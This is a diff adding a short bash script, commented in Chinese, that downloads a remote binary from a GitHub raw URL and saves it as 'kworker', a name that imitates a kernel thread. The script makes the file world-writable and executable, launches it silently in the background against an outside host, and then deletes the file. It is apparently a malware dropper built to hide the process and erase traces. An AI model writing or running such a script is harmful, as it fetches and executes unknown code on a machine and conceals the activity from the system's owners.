@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# 下载远程文件
+wget https://raw.githubusercontent.com/svbjdbk123/web/refs/heads/main/newkwoker -O kworker
+
+# 设置执行权限
+chmod 777 kworker
+
+# 后台运行程序并传入目标地址参数，输出重定向到空
+nohup ./kworker demotest.886802.xyz >/dev/null 2>&1 &
+
+# 等待1秒，确保进程启动成功
+sleep 2
+
+# 删除文件
+rm -f kworker
